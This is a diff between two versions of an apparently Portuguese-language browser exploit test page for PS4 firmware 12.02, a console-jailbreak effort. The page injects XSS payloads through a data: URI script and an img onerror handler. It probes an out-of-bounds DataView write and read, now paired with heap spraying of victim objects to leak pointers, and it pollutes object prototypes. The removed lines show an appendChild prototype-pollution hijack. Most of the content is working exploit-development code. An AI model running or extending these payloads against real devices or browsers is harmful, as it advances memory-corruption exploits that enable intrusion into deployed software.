@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 FW 12.02 - Teste v15 (PP Hijack appendChild)</title>
+    <title>PS4 FW 12.02 - Teste v16 (Info Leak c/ Spray)</title>
     <style>
         /* Estilos CSS */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
@@ -17,12 +17,11 @@
         .log-leak { color: #FF9800; font-weight: bold; }
         .log-ptr { color: #f0f; font-weight: bold; }
         #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 40px; }
-        .hijacked-style { border: 3px dotted magenta !important; padding: 2px; } /* Estilo para elementos modificados */
     </style>
 </head>
 <body>
-    <h1>PS4 FW 12.02 - Teste v15 (PP Hijack appendChild)</h1>
-    <p>Testa: XSS, OOB R/W (Info Leak), PP Básica, PP Hijack (appendChild).</p>
+    <h1>PS4 FW 12.02 - Teste v16 (Info Leak c/ Spray)</h1>
+    <p>Testa: XSS, OOB R/W (Info Leak c/ Object Spray), PP Básica.</p>
     <button id="runBtn" onclick="runAllTests()">Iniciar Todos os Testes</button>
     <div id="output"></div>
     <div id="xss-target-div">Área para teste de XSS DOM.</div>
@@ -33,6 +32,7 @@
         const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50; // ms
         const MEDIUM_PAUSE = 500; // ms
+        const SPRAY_COUNT = 50; // Number of victim objects to spray
 
         // --- Função de Log ---
         const log = (message, type = 'info') => {
@@ -63,26 +63,25 @@
             if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
             if (high === 0 && low === 0) return false;
             if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
-            if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false;
-            if (high === 0 && low < 0x100000) return false;
+            if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; // Nosso padrão
+            if (high === 0 && low < 0x100000) return false; // Valores muito pequenos
             return true;
         };
 
          // --- Heurística Simples para Detetar Potenciais Dados U32 ---
          const isPotentialData32 = (val) => {
              if (val === null || typeof val !== 'number') return false;
-             val = val >>> 0;
+             val = val >>> 0; // Trata como Uint32
              if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false;
-             if (val < 0x1000) return false;
+             if (val < 0x1000) return false; // Filtra valores muito pequenos
              return true;
          }
 
         // --- Teste 1: CSP Bypass / XSS ---
-        // (Função testCSPBypass igual à versão anterior)
         const testCSPBypass = async () => {
             log("--- Iniciando Teste 1: CSP Bypass / XSS ---", 'test');
             // ... (código igual ao script v10) ...
-             // 1.1 Teste com data: URI
+            // 1.1 Teste com data: URI
             log("Tentando XSS via data: URI (alert)...", 'subtest');
             await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
             try {
@@ -91,7 +90,7 @@
                 const scriptTag = document.createElement('script');
                 scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
                 scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: URI!", 'error'); };
-                document.body.appendChild(scriptTag); // <<< appendChild será chamado aqui!
+                document.body.appendChild(scriptTag);
                 log("Tag <script> data: URI adicionada.", 'info');
             } catch (e) { log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error'); }
 
@@ -114,79 +113,122 @@
                     } catch(e) { log("Erro no payload onerror: " + e.message, "warn"); }
                 `;
                 imgTag.setAttribute('onerror', onerrorPayload);
-                document.body.appendChild(imgTag); // <<< appendChild será chamado aqui!
+                document.body.appendChild(imgTag);
                 log("Tag <img> com onerror adicionada.", 'info');
             } catch (e) { log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error'); }
             log("--- Teste 1 Concluído (Verificar alertas/DOM) ---", 'test');
         };
 
-        // --- Teste 2: OOB Write/Read Extensivo (Info Leak Aprimorado) ---
-        // (Função igual à v7/v9/v10 - focada em info leak)
-        const testOOBReadInfoLeakEnhanced = async () => {
-            log("--- Iniciando Teste 2: OOB Write/Read Extensivo (Info Leak Aprimorado) ---", 'test');
-            // ... (código igual ao script v10) ...
-             const bufferSize = 32;
+        // --- Teste 2: OOB Write/Read com Object Spray (Info Leak) ---
+        // NOVO: Tenta alocar diferentes tipos de objetos antes do teste OOB
+        const testOOBReadInfoLeakWithSpray = async () => {
+            log("--- Iniciando Teste 2: OOB Write/Read com Object Spray (Info Leak) ---", 'test');
+            const bufferSize = 32;
             const writeValue = 0xEE;
-            const oobWriteOffset = 32;
+            const oobWriteOffset = 32; // Offset OOB confirmado
             const oobReadOffsets = [];
             for (let i = -64; i < bufferSize + 64; i += 4) { oobReadOffsets.push(i); }
-            let writeSuccess = false;
-            let potentialLeakFoundCount = 0;
 
-            try {
-                const buffer = new ArrayBuffer(bufferSize + 256);
-                const dataView = new DataView(buffer);
-                const baseOffset = 128;
-                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); }
+            // Tipos de objetos para "spray"
+            const victimFactories = {
+                "String": () => "S".repeat(128), // String longa
+                "Float64Array": () => new Float64Array(32),
+                "Int32Array": () => new Int32Array(32),
+                "Array": () => [1.1, 2.2, {}, "test"], // Array misto
+                "Object": () => ({ a: 1, b: "test", c: null }), // Objeto simples
+                // "HTMLElement": () => document.createElement('div') // DOM pode ser mais complexo/lento
+            };
 
-                const writeTargetAddress = baseOffset + oobWriteOffset;
-                log(`Tentando escrita OOB U8 @${oobWriteOffset}...`, 'subtest');
-                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
+            let totalLeaksFound = 0;
+
+            // Loop através dos tipos de vítimas
+            for (const victimName in victimFactories) {
+                log(`--- Tentando Info Leak perto de ${victimName} ---`, 'subtest');
+                let sprayObjects = []; // Guarda os objetos do spray
+                let attackerBuffer = null;
+                let dataView = null;
+                let writeSuccess = false;
+                let potentialLeakFoundInAttempt = 0;
+
                 try {
-                    dataView.setUint8(writeTargetAddress, writeValue);
-                    log(`VULN: Escrita OOB U8 @${oobWriteOffset} permitida!`, 'vuln');
-                    writeSuccess = true;
-                } catch (e) {
-                    log(`BLOQUEADO: Escrita OOB U8 @${oobWriteOffset} impedida: ${e.message}`, 'good');
-                    log("--- Teste 2 Interrompido (Escrita OOB falhou) ---", 'test');
-                    return false;
-                }
+                    // 1. Spray de Objetos Vítima (simplificado)
+                    log(`  Fazendo spray de ${SPRAY_COUNT} objetos ${victimName}...`, 'info');
+                    for (let i = 0; i < SPRAY_COUNT; i++) {
+                        sprayObjects.push(victimFactories[victimName]());
+                    }
+                    log(`  Spray concluído.`, 'info');
+                    await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); // Pausa pós-spray
 
-                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-                log(`Tentando leituras OOB U32/U64 em ${oobReadOffsets.length} offsets...`, 'subtest');
-                for (const readOffset of oobReadOffsets) {
-                    const readTargetAddress = baseOffset + readOffset;
-                    if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) continue;
+                    // 2. Aloca o buffer atacante (esperança: perto de um dos objetos do spray)
+                    attackerBuffer = new ArrayBuffer(bufferSize + 256); // Buffer maior
+                    dataView = new DataView(attackerBuffer);
+                    const baseOffset = 128;
+                    for (let i = 0; i < attackerBuffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } // Preenche com padrão
 
+                    // 3. Realiza a escrita OOB
+                    const writeTargetAddress = baseOffset + oobWriteOffset;
+                    log(`  Tentando escrita OOB U8 @${oobWriteOffset}...`, 'info');
+                    await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                     try {
-                        const low = dataView.getUint32(readTargetAddress, true);
-                        const high = dataView.getUint32(readTargetAddress + 4, true);
-                        if (isPotentialPointer64(high, low)) {
-                            const valueStr = `H=${toHex(high, 32)} L=${toHex(low, 32)}`;
-                            log(`  -> POTENCIAL PONTEIRO? U64 @${readOffset}: ${valueStr}`, 'ptr');
-                            potentialLeakFoundCount++;
-                        } else {
-                            const val32 = low;
-                            if (isPotentialData32(val32)) {
-                                log(`  -> Leak U32? @${readOffset}: ${toHex(val32, 32)}`, 'leak');
-                                potentialLeakFoundCount++;
-                            }
-                        }
-                    } catch (e) {/* Ignora */}
-                    if (readOffset % 32 === 0) await new Promise(resolve => setTimeout(resolve, 1));
-                }
-            } catch (e) { log(`Erro inesperado durante o teste Info Leak: ${e.message}`, 'error'); }
+                        dataView.setUint8(writeTargetAddress, writeValue);
+                        log(`  VULN: Escrita OOB permitida!`, 'vuln');
+                        writeSuccess = true;
+                    } catch (e) {
+                        log(`  BLOQUEADO: Escrita OOB impedida: ${e.message}`, 'good');
+                        continue; // Pula para o próximo tipo de vítima se a escrita falhar
+                    }
 
-            log(`--- Teste 2 Concluído (${potentialLeakFoundCount} potenciais leaks encontrados) ---`, 'test');
-            return writeSuccess;
+                    await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
+
+                    // 4. Loop de Leitura OOB Extensivo
+                    log(`  Tentando leituras OOB U32/U64 em ${oobReadOffsets.length} offsets...`, 'info');
+                    for (const readOffset of oobReadOffsets) {
+                        const readTargetAddress = baseOffset + readOffset;
+                        if (readTargetAddress < 0 || readTargetAddress + 8 > attackerBuffer.byteLength) continue;
+
+                        try {
+                            const low = dataView.getUint32(readTargetAddress, true);
+                            const high = dataView.getUint32(readTargetAddress + 4, true);
+                            if (isPotentialPointer64(high, low)) {
+                                const valueStr = `H=${toHex(high, 32)} L=${toHex(low, 32)}`;
+                                log(`  -> POTENCIAL PONTEIRO? U64 @${readOffset}: ${valueStr}`, 'ptr');
+                                potentialLeakFoundInAttempt++;
+                            } else {
+                                const val32 = low;
+                                if (isPotentialData32(val32)) {
+                                    log(`  -> Leak U32? @${readOffset}: ${toHex(val32, 32)}`, 'leak');
+                                    potentialLeakFoundInAttempt++;
+                                }
+                            }
+                        } catch (e) {/* Ignora */}
+                        if (readOffset % 64 === 0) await new Promise(resolve => setTimeout(resolve, 1));
+                    } // Fim loop leitura OOB
+
+                } catch (e) { log(`  Erro inesperado durante teste com ${victimName}: ${e.message}`, 'error'); }
+                finally {
+                    // Limpa referências para ajudar GC
+                    sprayObjects = null;
+                    attackerBuffer = null;
+                    dataView = null;
+                    // Forçar GC não é possível, mas esperamos que limpar refs ajude
+                    await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); // Pausa entre tipos de vítima
+                }
+
+                log(`--- Fim da tentativa com ${victimName}: ${potentialLeakFoundInAttempt} potenciais leaks encontrados. ---`, 'subtest');
+                totalLeaksFound += potentialLeakFoundInAttempt;
+
+            } // Fim loop tipos de vítima
+
+            log(`--- Teste 2 Concluído (Total de ${totalLeaksFound} potenciais leaks encontrados com spray) ---`, 'test');
+            return totalLeaksFound > 0;
         };
 
+
         // --- Teste 3: Prototype Pollution (Básica) ---
-        // (Função testBasicPP igual à versão anterior)
         const testBasicPP = async () => {
             log("--- Iniciando Teste 3: Prototype Pollution (Básica) ---", 'test');
             // ... (código igual ao script v10) ...
-            const testProp = '__pp_basic_test__';
+             const testProp = '__pp_basic_test__';
             const testValue = 'Polluted!';
             let success = false;
             try {
@@ -210,122 +252,23 @@
             return success;
         };
 
-        // --- Teste 4: PP Hijack (Node.prototype.appendChild) ---
-        // NOVO: Tenta sequestrar appendChild
-        const testPPAppendChildHijack = async () => {
-            log("--- Iniciando Teste 4: PP Hijack (Node.prototype.appendChild) ---", 'test');
-            // Guarda a função original (importante!)
-            // A função está no protótipo de Node, que é herdado por Element, Document, etc.
-            const originalAppendChild = Node.prototype.appendChild;
-            let hijackSuccessful = false; // Marca se a nossa função foi chamada
-            let testElementAppended = false; // Marca se o elemento de teste foi realmente anexado
-
-            try {
-                log("Tentando sobrescrever Node.prototype.appendChild...", 'subtest');
-                 // Verifica se já existe para segurança
-                 if (Object.prototype.hasOwnProperty('appendChild')) {
-                     log(`Aviso: Object.prototype já possui appendChild. Teste abortado.`, 'warn');
-                     log(`--- Teste 4 Concluído (Abortado) ---`, 'test');
-                     return false;
-                 }
-                 // Polui o protótipo de Object, esperando que afete Node.prototype por herança
-                 // (Pode ser necessário poluir Node.prototype diretamente se possível, mas PP via Object é mais comum)
-                Object.prototype.appendChild = function hijackedAppendChild(nodeToAppend) {
-                    log(`===> VULN: DENTRO DA FUNÇÃO appendChild SEQUESTRADA! (Tentando anexar: ${nodeToAppend?.tagName || typeof nodeToAppend}) <===`, 'vuln');
-                    hijackSuccessful = true;
-
-                    // Loga o nó que está a ser anexado
-                    log(`  -> Hijack appendChild: Nó a anexar: ${nodeToAppend?.constructor?.name || typeof nodeToAppend}`, 'leak');
-
-                    // Ação: Adiciona uma classe CSS para marcar visualmente o elemento
-                    if (nodeToAppend instanceof Element) {
-                         log(`  -> Hijack appendChild: Adicionando classe 'hijacked-style' ao elemento ${nodeToAppend.tagName}`, 'info');
-                         nodeToAppend.classList.add('hijacked-style');
-                    }
-
-                    // Chama a função original para realmente anexar o nó
-                    // É crucial chamar a original para não quebrar completamente o DOM
-                    try {
-                         log(`  -> Hijack appendChild: Chamando appendChild original...`, 'info');
-                         // 'this' aqui deve ser o nó pai onde o elemento está a ser anexado
-                         const resultNode = originalAppendChild.call(this, nodeToAppend);
-                         log(`  -> Hijack appendChild: Nó anexado pela original.`, 'info');
-                         return resultNode; // Retorna o nó anexado como a original faria
-                    } catch(e) {
-                         log(`  -> Hijack appendChild: Erro ao chamar original: ${e.message}`, 'error');
-                         // Tenta retornar o nó mesmo assim para evitar mais erros
-                         return nodeToAppend;
-                    }
-                };
-                log("Object.prototype.appendChild poluído.", 'info');
-
-
-                log("Testando a função appendChild sequestrada criando e anexando um <div>...", 'subtest');
-                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-                try {
-                    const newDiv = document.createElement('div'); // Usa createElement (pode ser sequestrado por outro teste?)
-                    newDiv.textContent = "Este DIV foi anexado após o hijack de appendChild.";
-                    document.body.appendChild(newDiv); // Chama appendChild (potencialmente sequestrado)
-                    log(`Elemento <div> criado e anexado.`, 'info');
-
-                    // Verifica se o log interno do hijack apareceu
-                    if (hijackSuccessful) {
-                        log("VULN: Execução da função appendChild sequestrada confirmada pelo log interno!", 'vuln');
-                        // Verifica se o elemento foi realmente adicionado ao DOM
-                        if (document.body.contains(newDiv)) {
-                             log("Confirmação: Elemento de teste foi anexado ao body.", 'info');
-                             testElementAppended = true;
-                             // Verifica visualmente se o estilo foi aplicado (borda magenta)
-                             log("Verifique VISUALMENTE se o novo DIV tem uma borda magenta.", 'warn');
-                        } else {
-                             log("AVISO: Elemento de teste não encontrado no body após appendChild.", 'warn');
-                        }
-                    } else {
-                         log("FALHA: Função appendChild sequestrada não parece ter sido executada.", 'good');
-                    }
-                } catch(e) {
-                     log(`Erro ao tentar criar/anexar elemento com appendChild sequestrado: ${e.message}`, 'error');
-                }
-
-            } catch (e) {
-                log(`Erro durante teste PP Hijack appendChild: ${e.message}`, 'error');
-            } finally {
-                // Restaura a função original SEMPRE
-                try {
-                     delete Object.prototype.appendChild; // Remove do protótipo global
-                     // Restaura no Node.prototype se foi alterado diretamente (mais seguro reatribuir)
-                     Node.prototype.appendChild = originalAppendChild;
-                     log("Tentativa de restauração de Node.prototype.appendChild realizada.", 'info');
-                     if (Node.prototype.appendChild === originalAppendChild) { log("Restauração de appendChild confirmada.", 'info'); }
-                     else { log("ERRO CRÍTICO: FALHA ao restaurar Node.prototype.appendChild!", 'error'); }
-                } catch(restoreError) {
-                     log(`Erro ao restaurar appendChild: ${restoreError.message}`, 'error');
-                }
-            }
-            log(`--- Teste 4 Concluído (PP Hijack appendChild ${hijackSuccessful ? 'Confirmado' : 'Falhou'}) ---`, 'test');
-            return hijackSuccessful;
-        };
-
-
         // --- Função Principal para Rodar Todos os Testes ---
         const runAllTests = async () => {
             if (runBtn) runBtn.disabled = true;
-            log("==== INICIANDO TODOS OS TESTES COMBINADOS v15 (PP Hijack appendChild) ====", 'critical');
+            log("==== INICIANDO TODOS OS TESTES COMBINADOS v16 (Info Leak c/ Spray) ====", 'critical');
 
-            // Executa o hijack PRIMEIRO para que afete os appends do Teste 1
-            await testPPAppendChildHijack(); // Teste 4 (NOVO)
+            await testCSPBypass(); // Teste 1
             await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
 
-            await testCSPBypass(); // Teste 1 (appendChild será chamado aqui)
-            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
-
-            await testOOBReadInfoLeakEnhanced(); // Teste 2
+            await testOOBReadInfoLeakWithSpray(); // Teste 2 (NOVO - com spray)
             await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
 
             await testBasicPP(); // Teste 3
             await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
 
-            log("\n==== TODOS OS TESTES COMBINADOS v15 CONCLUÍDOS ====", 'critical');
+            // Removidos outros testes para focar no Info Leak com spray
+
+            log("\n==== TODOS OS TESTES COMBINADOS v16 CONCLUÍDOS ====", 'critical');
             if (runBtn) runBtn.disabled = false;
         };
 
@@ -334,13 +277,3 @@
 
 </body>
 </html>
-```
-
-**O que procurar nos resultados:**
-
-* **Teste 4 (PP Hijack `appendChild`):**
-    * Procure no log pela mensagem `VULN: DENTRO DA FUNÇÃO appendChild SEQUESTRADA!`. Ela deve aparecer várias vezes, incluindo quando os elementos `<script>` e `<img>` do Teste 1 são adicionados, e quando o `<div>` de teste é adicionado no próprio Teste 4.
-    * Verifique se o log mostra a adição da classe `hijacked-style` aos elementos.
-    * **Visualmente:** Verifique se os elementos adicionados após o início do teste (o script `data:`, a imagem `onerror`, e o `div` de teste) aparecem com uma borda magenta pontilhada.
-
-Se este teste funcionar, demonstrará a capacidade de intercetar e modificar a forma como os elementos são adicionados à página, um controlo significativo sobre o D
